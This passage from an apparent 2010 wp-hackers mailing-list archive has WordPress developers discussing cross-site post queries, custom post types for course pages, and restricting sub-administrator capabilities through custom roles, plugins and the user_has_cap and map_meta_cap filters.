References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>	<AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com>	<AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com>	<2800CA70-4234-4448-8230-9723EC7718FB@ftwr.co.uk>	<AANLkTi=JefbxKzkH53Gh3dTVRYpYpJJ6NArL729kR=aq@mail.gmail.com>	<005801cb2e27$a21ea270$e65be750$@co.uk>
	<3E70F50F-DCD6-48E7-9C08-7E95812041CF@newclarity.net>
	<007401cb2e40$718928b0$549b7a10$@co.uk>
Message-ID: <CE68B1B9-68D1-4A63-BF81-2785E6FF7F87@ftwr.co.uk>


On 28 Jul 2010, at 11:34, Dan Smart wrote:

> Ok to do that I'll have to maintain a cross-referenced list of courses to
> post ids, and add new courses / delete them where necessary, but that sounds
> maintainable.

You should easily be able to do this with a piece of post_meta to identify which is which.

-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From jer at simianuprising.com  Wed Jul 28 17:33:24 2010
From: jer at simianuprising.com (Jeremy Clarke)
Date: Wed, 28 Jul 2010 13:33:24 -0400
Subject: [wp-hackers] Querying posts of another WordPress install
In-Reply-To: <AANLkTi=CHq9bUukSa19MgJVSUU1CuQYfzUj6RBvmy3NS@mail.gmail.com>
References: <AANLkTi=CHq9bUukSa19MgJVSUU1CuQYfzUj6RBvmy3NS@mail.gmail.com>
Message-ID: <AANLkTimy_BoYLt=2pZszxz4OasYVKHnAp5TamvpJz-2a@mail.gmail.com>

If you are not using Multisite then there is no API way to query posts from
another site without running custom queries.

NOTE: if you want something for a db on the same server but not in the same
actual db then you can create a new copy of $wpdb specifically for the
external database, then you just do $my_wpdb->query() etc. to access the
external database.

I have found that in such situations it is almost always possible and easy
to use RSS to show posts from other sites. You just need to figure out the
url of the posts you want to show on the source site, then add /feed/ at the
end to make it RSS format (or add ?feed=rss2 to any url-variable based
queries). For most post queries this works very well.

On the site you want to show the posts on you use a RSS widget to display
the headlines. This is part of what RSS is designed for and the built-in
feed caching in WP does a pretty good job. If you don't want to use the RSS
widget you can also call the underlying SimplePie functions and their WP
wrappers (see the rss widget) to show the feed directly, this will also use
the built-in caching.

-- 
Jeremy Clarke
Code and Design | globalvoicesonline.org

From rbilesky at gmail.com  Wed Jul 28 18:06:48 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Wed, 28 Jul 2010 11:06:48 -0700
Subject: [wp-hackers] Partial admin capabilities
In-Reply-To: <AANLkTi=kgJT1gOp6NQQTjWHD4uxFzWBeJNaZRcbCDkHn@mail.gmail.com>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>
	<AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com>
	<AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com>
	<2800CA70-4234-4448-8230-9723EC7718FB@ftwr.co.uk>
	<AANLkTi=JefbxKzkH53Gh3dTVRYpYpJJ6NArL729kR=aq@mail.gmail.com>
	<AANLkTiktBamO2yo5Jvf2uhoO-i3pbJQMNefeoC-Xb6-c@mail.gmail.com>
	<AANLkTi=kgJT1gOp6NQQTjWHD4uxFzWBeJNaZRcbCDkHn@mail.gmail.com>
Message-ID: <AANLkTikC66sMBD==Bj0HW18FTmTEWDoD60dnwMD2jTTP@mail.gmail.com>

That helped.  I think I have it, tell me what you think:

http://pastebin.com/zHMjpYv3

On Wed, Jul 28, 2010 at 2:50 AM, John Blackbourn
<johnbillion+wp at gmail.com<johnbillion%2Bwp at gmail.com>
> wrote:

> On Wed, Jul 28, 2010 at 8:29 AM, Ryan Bilesky <rbilesky at gmail.com> wrote:
> > Thats my Psudo code based on my understanding on how this is going to
> work.
> > So heres my thing, assuming I got that part of it right, how would I
> start
> > off the function, what arguments would it receive and in what order to
> tell
> > me what capability is being tested and what WordPresses reponse was.
>
> The user_has_cap filter isn't an easy one for someone who isn't used
> to WordPress, and it's not very well documented as you point out.
>
> Here is a reasonably well commented block of code from a plugin of
> mine I wrote for a client. It might help you to start to understand
> it. This particular filter has a very specific purpose which is to
> allow authors to edit contributors' posts if the post is pending.
> http://pastebin.ca/1909968 .
>
> HTH
> John
>  _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at andrewnacin.com  Wed Jul 28 18:10:44 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Wed, 28 Jul 2010 14:10:44 -0400
Subject: [wp-hackers] Partial admin capabilities
In-Reply-To: <AANLkTikC66sMBD==Bj0HW18FTmTEWDoD60dnwMD2jTTP@mail.gmail.com>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com> 
	<AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com> 
	<AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com> 
	<2800CA70-4234-4448-8230-9723EC7718FB@ftwr.co.uk>
	<AANLkTi=JefbxKzkH53Gh3dTVRYpYpJJ6NArL729kR=aq@mail.gmail.com> 
	<AANLkTiktBamO2yo5Jvf2uhoO-i3pbJQMNefeoC-Xb6-c@mail.gmail.com> 
	<AANLkTi=kgJT1gOp6NQQTjWHD4uxFzWBeJNaZRcbCDkHn@mail.gmail.com> 
	<AANLkTikC66sMBD==Bj0HW18FTmTEWDoD60dnwMD2jTTP@mail.gmail.com>
Message-ID: <AANLkTik4MMFF03JykpURNmYAYtqRDbQeBjrn-tRz=wBy@mail.gmail.com>

On Wed, Jul 28, 2010 at 2:06 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:

> That helped.  I think I have it, tell me what you think:
>
> http://pastebin.com/zHMjpYv3


You can stack case statements. Will save you quite a bit of code there.
http://us2.php.net/manual/en/control-structures.switch.php

From rbilesky at gmail.com  Wed Jul 28 18:36:22 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Wed, 28 Jul 2010 11:36:22 -0700
Subject: [wp-hackers] Partial admin capabilities
In-Reply-To: <AANLkTik4MMFF03JykpURNmYAYtqRDbQeBjrn-tRz=wBy@mail.gmail.com>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>
	<AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com>
	<AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com>
	<2800CA70-4234-4448-8230-9723EC7718FB@ftwr.co.uk>
	<AANLkTi=JefbxKzkH53Gh3dTVRYpYpJJ6NArL729kR=aq@mail.gmail.com>
	<AANLkTiktBamO2yo5Jvf2uhoO-i3pbJQMNefeoC-Xb6-c@mail.gmail.com>
	<AANLkTi=kgJT1gOp6NQQTjWHD4uxFzWBeJNaZRcbCDkHn@mail.gmail.com>
	<AANLkTikC66sMBD==Bj0HW18FTmTEWDoD60dnwMD2jTTP@mail.gmail.com>
	<AANLkTik4MMFF03JykpURNmYAYtqRDbQeBjrn-tRz=wBy@mail.gmail.com>
Message-ID: <AANLkTi=G9SGFFhpSm2Me5nkNzS9pD3NkP14AJ821mevG@mail.gmail.com>

idk why but this doesn't even seem to be working.

On Wed, Jul 28, 2010 at 11:10 AM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Wed, Jul 28, 2010 at 2:06 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
>
> > That helped.  I think I have it, tell me what you think:
> >
> > http://pastebin.com/zHMjpYv3
>
>
> You can stack case statements. Will save you quite a bit of code there.
> http://us2.php.net/manual/en/control-structures.switch.php
>  _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jer at simianuprising.com  Wed Jul 28 18:49:31 2010
From: jer at simianuprising.com (Jeremy Clarke)
Date: Wed, 28 Jul 2010 14:49:31 -0400
Subject: [wp-hackers] Best format for regularly updated data
In-Reply-To: <CE68B1B9-68D1-4A63-BF81-2785E6FF7F87@ftwr.co.uk>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>
	<AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com>
	<AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com>
	<2800CA70-4234-4448-8230-9723EC7718FB@ftwr.co.uk>
	<AANLkTi=JefbxKzkH53Gh3dTVRYpYpJJ6NArL729kR=aq@mail.gmail.com>
	<005801cb2e27$a21ea270$e65be750$@co.uk>
	<3E70F50F-DCD6-48E7-9C08-7E95812041CF@newclarity.net>
	<007401cb2e40$718928b0$549b7a10$@co.uk>
	<CE68B1B9-68D1-4A63-BF81-2785E6FF7F87@ftwr.co.uk>
Message-ID: <AANLkTikQ5OFxtmRhXni7vHuYV85dvWeABr2+WtX8wHFG@mail.gmail.com>

On Wed, Jul 28, 2010 at 1:00 PM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:

> With custom post types for Courses over Pages you get ability to:
>
> 1. Query for Courses only using WP_Query("post_type=course").
> 2. Have a Course-specific template in your theme, i.e. single-course.php.
> 3. Have a Course-specific admin edit page with Course-specific metaboxes.
> 4. Have Course-specific taxonomy terms that only apply to Courses.
> 5. Get a Course-specific URLs, i.e.
> http://example.com/courses/{course-name}/<http://example.com/courses/%7Bcourse-name%7D/>
>
> They are probably more reasons but these are 5 that come to mind (anyone
> else know of others?) Worthwhile for your use-cases?
>

6. It would leave the actual pages alone, so any non-course pages on the
site do not have to work around whatever hacks/mods you make in the theme to
accomodate the course pages.

Really it's part of 1-5 but I think its worth mentioning as a consideration.

-- 
Jeremy Clarke
Code and Design | globalvoicesonline.org

From jer at simianuprising.com  Wed Jul 28 19:00:09 2010
From: jer at simianuprising.com (Jeremy Clarke)
Date: Wed, 28 Jul 2010 15:00:09 -0400
Subject: [wp-hackers] Partial admin capabilities
In-Reply-To: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>
Message-ID: <AANLkTim2kKnacHck0Unq0GmxmADewwFRt=-eVGSos-=9@mail.gmail.com>

I have a feeling this thread is proposing solutions that are unnecessarily
complicated based on his initial question:

On Tue, Jul 27, 2010 at 6:02 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:

> The purpose of this would be
> to restrict certain actions to just me, even though I have other
> "administrators" on the blog, I want them to have some of the admin
> capabilities but not all,
>

Ryan, are you aware that the role/capability system allows for the creation
of new roles with customized sets of capabilities? To accomplish what you
describe all you need to do is create a role which has the set of caps that
you want your sub-admins to have, but not the ones you want to keep for
yourself.

You can do this either by creating a whole new role with the caps you want,
or by adding the missing ones to the 'editor' role, and giving that to your
sub-admins. The default roles (contributor, author, editor, administrator)
are just defaults, you can have whatever combinations of powers that you
want.

That said you need a plugin to modify the roles and capabilities. Luckily
all plugins that do this are similar in that they use a hidden API in
wordpress, so if your plugin stops working there will probably be a new one
you can switch to which will understand whatever you already changed.

I use this one lately. It's not perfect but it works:
http://wordpress.org/extend/plugins/capsman/

Anyone have recommendations for a better one? I'd love one that has all the
powers the broken old Role Manager plugin had (esp. the ability to assign
custom caps to specific users without creating a whole new role, which the
API supports but Capability Manager does not).

-- 
Jeremy Clarke
Code and Design | globalvoicesonline.org

From mmuro at advance.ua.edu  Wed Jul 28 19:04:37 2010
From: mmuro at advance.ua.edu (Muro, Matthew)
Date: Wed, 28 Jul 2010 14:04:37 -0500
Subject: [wp-hackers] Partial admin capabilities
In-Reply-To: <AANLkTim2kKnacHck0Unq0GmxmADewwFRt=-eVGSos-=9@mail.gmail.com>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>
	<AANLkTim2kKnacHck0Unq0GmxmADewwFRt=-eVGSos-=9@mail.gmail.com>
Message-ID: <AE0A0DDD-76E6-4DE5-88C4-7A7B02768691@ur.ua.edu>

Members is probably the best roles and capabilities plugin out there.

http://wordpress.org/extend/plugins/members/

Matthew Muro


On Jul 28, 2010, at 2:00 PM, Jeremy Clarke wrote:

I have a feeling this thread is proposing solutions that are unnecessarily
complicated based on his initial question:

On Tue, Jul 27, 2010 at 6:02 PM, Ryan Bilesky <rbilesky at gmail.com<mailto:rbilesky at gmail.com>> wrote:

The purpose of this would be
to restrict certain actions to just me, even though I have other
"administrators" on the blog, I want them to have some of the admin
capabilities but not all,


Ryan, are you aware that the role/capability system allows for the creation
of new roles with customized sets of capabilities? To accomplish what you
describe all you need to do is create a role which has the set of caps that
you want your sub-admins to have, but not the ones you want to keep for
yourself.

You can do this either by creating a whole new role with the caps you want,
or by adding the missing ones to the 'editor' role, and giving that to your
sub-admins. The default roles (contributor, author, editor, administrator)
are just defaults, you can have whatever combinations of powers that you
want.

That said you need a plugin to modify the roles and capabilities. Luckily
all plugins that do this are similar in that they use a hidden API in
wordpress, so if your plugin stops working there will probably be a new one
you can switch to which will understand whatever you already changed.

I use this one lately. It's not perfect but it works:
http://wordpress.org/extend/plugins/capsman/

Anyone have recommendations for a better one? I'd love one that has all the
powers the broken old Role Manager plugin had (esp. the ability to assign
custom caps to specific users without creating a whole new role, which the
API supports but Capability Manager does not).

--
Jeremy Clarke
Code and Design | globalvoicesonline.org
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


From rbilesky at gmail.com  Wed Jul 28 19:33:54 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Wed, 28 Jul 2010 12:33:54 -0700
Subject: [wp-hackers] Partial admin capabilities
In-Reply-To: <AANLkTim2kKnacHck0Unq0GmxmADewwFRt=-eVGSos-=9@mail.gmail.com>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>
	<AANLkTim2kKnacHck0Unq0GmxmADewwFRt=-eVGSos-=9@mail.gmail.com>
Message-ID: <AANLkTimJLFXE-Sk_gCSYwd+xpRTDGYBwpcn0Gg=JOxNM@mail.gmail.com>

Nice plugins but they just don't seem to work for my situation.

On Wed, Jul 28, 2010 at 12:00 PM, Jeremy Clarke <jer at simianuprising.com>wrote:

> I have a feeling this thread is proposing solutions that are unnecessarily
> complicated based on his initial question:
>
> On Tue, Jul 27, 2010 at 6:02 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
>
> > The purpose of this would be
> > to restrict certain actions to just me, even though I have other
> > "administrators" on the blog, I want them to have some of the admin
> > capabilities but not all,
> >
>
> Ryan, are you aware that the role/capability system allows for the creation
> of new roles with customized sets of capabilities? To accomplish what you
> describe all you need to do is create a role which has the set of caps that
> you want your sub-admins to have, but not the ones you want to keep for
> yourself.
>
> You can do this either by creating a whole new role with the caps you want,
> or by adding the missing ones to the 'editor' role, and giving that to your
> sub-admins. The default roles (contributor, author, editor, administrator)
> are just defaults, you can have whatever combinations of powers that you
> want.
>
> That said you need a plugin to modify the roles and capabilities. Luckily
> all plugins that do this are similar in that they use a hidden API in
> wordpress, so if your plugin stops working there will probably be a new one
> you can switch to which will understand whatever you already changed.
>
> I use this one lately. It's not perfect but it works:
> http://wordpress.org/extend/plugins/capsman/
>
> Anyone have recommendations for a better one? I'd love one that has all the
> powers the broken old Role Manager plugin had (esp. the ability to assign
> custom caps to specific users without creating a whole new role, which the
> API supports but Capability Manager does not).
>
> --
> Jeremy Clarke
> Code and Design | globalvoicesonline.org
>  _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From piemanek at gmail.com  Wed Jul 28 19:56:15 2010
From: piemanek at gmail.com (Simon Blackbourn)
Date: Wed, 28 Jul 2010 20:56:15 +0100
Subject: [wp-hackers] Partial admin capabilities
In-Reply-To: <AANLkTimJLFXE-Sk_gCSYwd+xpRTDGYBwpcn0Gg=JOxNM@mail.gmail.com>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>
	<AANLkTim2kKnacHck0Unq0GmxmADewwFRt=-eVGSos-=9@mail.gmail.com>
	<AANLkTimJLFXE-Sk_gCSYwd+xpRTDGYBwpcn0Gg=JOxNM@mail.gmail.com>
Message-ID: <AANLkTi=8O6uWfyfrKZMavURFpVXk=m65+BDg60m1zk5V@mail.gmail.com>

Hi Ryan

You wrote:


> I have other "administrators" on the blog, I want them to have some of the
> admin capabilities but not all
>


Nice plugins but they just don't seem to work for my situation.
>
>
I use the Members plugin for exactly what you say you need on several sites:

 - install it,
 - go into the options to activate the "Edit Roles" and "New Roles"
components,
 - under the Users menu click "New Role",
 - create a new role called "Nearlyadmin" (or whatever),
 - give this new role all the capabilities the admin has except the ones you
don't want them to have,
 - assign the other users to this new role.

Hey presto!

Simon

From rbilesky at gmail.com  Wed Jul 28 20:00:11 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Wed, 28 Jul 2010 13:00:11 -0700
Subject: [wp-hackers] Partial admin capabilities
In-Reply-To: <AANLkTi=8O6uWfyfrKZMavURFpVXk=m65+BDg60m1zk5V@mail.gmail.com>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>
	<AANLkTim2kKnacHck0Unq0GmxmADewwFRt=-eVGSos-=9@mail.gmail.com>
	<AANLkTimJLFXE-Sk_gCSYwd+xpRTDGYBwpcn0Gg=JOxNM@mail.gmail.com>
	<AANLkTi=8O6uWfyfrKZMavURFpVXk=m65+BDg60m1zk5V@mail.gmail.com>
Message-ID: <AANLkTinieeV2gd7gDYQdJDBgnVR=g138O=wXM1XypZX7@mail.gmail.com>

I installed it on my dev site but it just dosen't quite work for me.  And
besides I already have the code per the initial suggestion and just need to
debug it.  and it is gcode that I think I can use elsewhere to achomplish
other tasks.

On Wed, Jul 28, 2010 at 12:56 PM, Simon Blackbourn <piemanek at gmail.com>wrote:

> Hi Ryan
>
> You wrote:
>
>
> > I have other "administrators" on the blog, I want them to have some of
> the
> > admin capabilities but not all
> >
>
>
> Nice plugins but they just don't seem to work for my situation.
> >
> >
> I use the Members plugin for exactly what you say you need on several
> sites:
>
>  - install it,
>  - go into the options to activate the "Edit Roles" and "New Roles"
> components,
>  - under the Users menu click "New Role",
>  - create a new role called "Nearlyadmin" (or whatever),
>  - give this new role all the capabilities the admin has except the ones
> you
> don't want them to have,
>  - assign the other users to this new role.
>
> Hey presto!
>
> Simon
>  _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mda at blogwaffe.com  Wed Jul 28 20:07:10 2010
From: mda at blogwaffe.com (Michael D Adams)
Date: Wed, 28 Jul 2010 13:07:10 -0700
Subject: [wp-hackers] Partial admin capabilities
In-Reply-To: <AANLkTi=G9SGFFhpSm2Me5nkNzS9pD3NkP14AJ821mevG@mail.gmail.com>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com> 
	<AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com> 
	<AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com> 
	<2800CA70-4234-4448-8230-9723EC7718FB@ftwr.co.uk>
	<AANLkTi=JefbxKzkH53Gh3dTVRYpYpJJ6NArL729kR=aq@mail.gmail.com> 
	<AANLkTiktBamO2yo5Jvf2uhoO-i3pbJQMNefeoC-Xb6-c@mail.gmail.com> 
	<AANLkTi=kgJT1gOp6NQQTjWHD4uxFzWBeJNaZRcbCDkHn@mail.gmail.com> 
	<AANLkTikC66sMBD==Bj0HW18FTmTEWDoD60dnwMD2jTTP@mail.gmail.com> 
	<AANLkTik4MMFF03JykpURNmYAYtqRDbQeBjrn-tRz=wBy@mail.gmail.com> 
	<AANLkTi=G9SGFFhpSm2Me5nkNzS9pD3NkP14AJ821mevG@mail.gmail.com>
Message-ID: <AANLkTinf0d=uUTnLwnqSEyAkwdFtMFwBqj5vRgFdbYQa@mail.gmail.com>

On Wed, Jul 28, 2010 at 11:36 AM, Ryan Bilesky <rbilesky at gmail.com> wrote:
> idk why but this doesn't even seem to be working.

As others have mentioned, the user_has_cap is a little confusing.
You've run into a few of it's problems.

1. Don't check against the current_user, check against the user passed
to the filter.  Some parts of WordPress do things like
$some_user->has_cap( $cap ) (where $some_user is not the current user)
in addition to current_user_can( $cap ); your code needs to be looking
at the correct user in both cases.

2. You're switching on an array - not on a single cap.

3. The cap you want is passed as the first element of the third
parameter, not the second parameter.  The second parameter is an array
of capabilities WordPress has decided the user must have for the
current_user_can() or has_cap() check to pass.

(4. As Nacin mentions, your code can be significantly simplified with
a prettier switch statement.)

Try this: http://pastebin.com/5HmAt92Q

You could also accomplish the same thing using the map_meta_cap filter
whose arguments are a little more straightforward, but whose return
value is a little stranger.  So it might be more or less intuitive for
you: http://pastebin.com/EYBeLKBD

Mike
--mdawaffe

PS: I also agree you could do all of this with a custom role.

From rbilesky at gmail.com  Wed Jul 28 20:13:47 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Wed, 28 Jul 2010 13:13:47 -0700
Subject: [wp-hackers] Partial admin capabilities
In-Reply-To: <AANLkTinf0d=uUTnLwnqSEyAkwdFtMFwBqj5vRgFdbYQa@mail.gmail.com>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>
	<AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com>
	<AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com>
	<2800CA70-4234-4448-8230-9723EC7718FB@ftwr.co.uk>
	<AANLkTi=JefbxKzkH53Gh3dTVRYpYpJJ6NArL729kR=aq@mail.gmail.com>
	<AANLkTiktBamO2yo5Jvf2uhoO-i3pbJQMNefeoC-Xb6-c@mail.gmail.com>
	<AANLkTi=kgJT1gOp6NQQTjWHD4uxFzWBeJNaZRcbCDkHn@mail.gmail.com>
	<AANLkTikC66sMBD==Bj0HW18FTmTEWDoD60dnwMD2jTTP@mail.gmail.com>
	<AANLkTik4MMFF03JykpURNmYAYtqRDbQeBjrn-tRz=wBy@mail.gmail.com>
	<AANLkTi=G9SGFFhpSm2Me5nkNzS9pD3NkP14AJ821mevG@mail.gmail.com>
	<AANLkTinf0d=uUTnLwnqSEyAkwdFtMFwBqj5vRgFdbYQa@mail.gmail.com>
Message-ID: <AANLkTikbmEVD822cUZYo0=qcVY5Jg0gn4DBM1kwSKpun@mail.gmail.com>

Ok, so where is the userid it is testing passed in?

On Wed, Jul 28, 2010 at 1:07 PM, Michael D Adams <mda at blogwaffe.com> wrote:

> On Wed, Jul 28, 2010 at 11:36 AM, Ryan Bilesky <rbilesky at gmail.com> wrote:
> > idk why but this doesn't even seem to be working.
>
> As others have mentioned, the user_has_cap is a little confusing.
> You've run into a few of it's problems.
>
> 1. Don't check against the current_user, check against the user passed
> to the filter.  Some parts of WordPress do things like
> $some_user->has_cap( $cap ) (where $some_user is not the current user)
> in addition to current_user_can( $cap ); your code needs to be looking
> at the correct user in both cases.
>
> 2. You're switching on an array - not on a single cap.
>
> 3. The cap you want is passed as the first element of the third
> parameter, not the second parameter.  The second parameter is an array
> of capabilities WordPress has decided the user must have for the
> current_user_can() or has_cap() check to pass.
>
> (4. As Nacin mentions, your code can be significantly simplified with
> a prettier switch statement.)
>
> Try this: http://pastebin.com/5HmAt92Q
>
> You could also accomplish the same thing using the map_meta_cap filter
> whose arguments are a little more straightforward, but whose return
> value is a little stranger.  So it might be more or less intuitive for
> you: http://pastebin.com/EYBeLKBD
>
> Mike
> --mdawaffe
>
> PS: I also agree you could do all of this with a custom role.
>  _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mda at blogwaffe.com  Wed Jul 28 20:20:13 2010
From: mda at blogwaffe.com (Michael D Adams)
Date: Wed, 28 Jul 2010 13:20:13 -0700
Subject: [wp-hackers] Partial admin capabilities
In-Reply-To: <AANLkTikbmEVD822cUZYo0=qcVY5Jg0gn4DBM1kwSKpun@mail.gmail.com>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com> 
	<AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com> 
	<AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com> 
	<2800CA70-4234-4448-8230-9723EC7718FB@ftwr.co.uk>
	<AANLkTi=JefbxKzkH53Gh3dTVRYpYpJJ6NArL729kR=aq@mail.gmail.com> 
	<AANLkTiktBamO2yo5Jvf2uhoO-i3pbJQMNefeoC-Xb6-c@mail.gmail.com> 
	<AANLkTi=kgJT1gOp6NQQTjWHD4uxFzWBeJNaZRcbCDkHn@mail.gmail.com> 
	<AANLkTikC66sMBD==Bj0HW18FTmTEWDoD60dnwMD2jTTP@mail.gmail.com> 
	<AANLkTik4MMFF03JykpURNmYAYtqRDbQeBjrn-tRz=wBy@mail.gmail.com> 
	<AANLkTi=G9SGFFhpSm2Me5nkNzS9pD3NkP14AJ821mevG@mail.gmail.com> 
	<AANLkTinf0d=uUTnLwnqSEyAkwdFtMFwBqj5vRgFdbYQa@mail.gmail.com> 
	<AANLkTikbmEVD822cUZYo0=qcVY5Jg0gn4DBM1kwSKpun@mail.gmail.com>
Message-ID: <AANLkTik_EAcznJtuUXyD29W=dP0x0E8zqGm3SDczQHWV@mail.gmail.com>

On Wed, Jul 28, 2010 at 1:13 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
> Ok, so where is the userid it is testing passed in?

Did you try either of the functions I pasted?

user_has_cap: http://pastebin.com/5HmAt92Q
The user_id is passed as key=1 in the 3rd argument to the filter.

map_meta_cap: http://pastebin.com/EYBeLKBD
The user_id is passed as the 3rd argument to the filter.

You only need to use one of those plugins.  I gave you both so you
could see how each filter works and decide for yourself which method
makes more sense to you.

From rbilesky at gmail.com  Wed Jul 28 20:26:02 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Wed, 28 Jul 2010 13:26:02 -0700
Subject: [wp-hackers] Partial admin capabilities
In-Reply-To: <AANLkTik_EAcznJtuUXyD29W=dP0x0E8zqGm3SDczQHWV@mail.gmail.com>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>
	<AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com>
	<AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com>
	<2800CA70-4234-4448-8230-9723EC7718FB@ftwr.co.uk>
	<AANLkTi=JefbxKzkH53Gh3dTVRYpYpJJ6NArL729kR=aq@mail.gmail.com>
	<AANLkTiktBamO2yo5Jvf2uhoO-i3pbJQMNefeoC-Xb6-c@mail.gmail.com>
	<AANLkTi=kgJT1gOp6NQQTjWHD4uxFzWBeJNaZRcbCDkHn@mail.gmail.com>
	<AANLkTikC66sMBD==Bj0HW18FTmTEWDoD60dnwMD2jTTP@mail.gmail.com>
	<AANLkTik4MMFF03JykpURNmYAYtqRDbQeBjrn-tRz=wBy@mail.gmail.com>
	<AANLkTi=G9SGFFhpSm2Me5nkNzS9pD3NkP14AJ821mevG@mail.gmail.com>
	<AANLkTinf0d=uUTnLwnqSEyAkwdFtMFwBqj5vRgFdbYQa@mail.gmail.com>
	<AANLkTikbmEVD822cUZYo0=qcVY5Jg0gn4DBM1kwSKpun@mail.gmail.com>
	<AANLkTik_EAcznJtuUXyD29W=dP0x0E8zqGm3SDczQHWV@mail.gmail.com>
Message-ID: <AANLkTinQzN5Ji57AzYSO7NS1G42zdWRGjq8cqQeeQH2Z@mail.gmail.com>

Perfect, I tested it and it is now working.

http://pastebin.com/0VnVgktV

On Wed, Jul 28, 2010 at 1:20 PM, Michael D Adams <mda at blogwaffe.com> wrote:

> On Wed, Jul 28, 2010 at 1:13 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
> > Ok, so where is the userid it is testing passed in?
>
> Did you try either of the functions I pasted?
>
> user_has_cap: http://pastebin.com/5HmAt92Q
> The user_id is passed as key=1 in the 3rd argument to the filter.
>
> map_meta_cap: http://pastebin.com/EYBeLKBD
> The user_id is passed as the 3rd argument to the filter.
>
> You only need to use one of those plugins.  I gave you both so you
> could see how each filter works and decide for yourself which method
> makes more sense to you.
>  _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mda at blogwaffe.com  Wed Jul 28 20:40:27 2010
From: mda at blogwaffe.com (Michael D Adams)
Date: Wed, 28 Jul 2010 13:40:27 -0700
Subject: [wp-hackers] Partial admin capabilities
In-Reply-To: <AANLkTinQzN5Ji57AzYSO7NS1G42zdWRGjq8cqQeeQH2Z@mail.gmail.com>
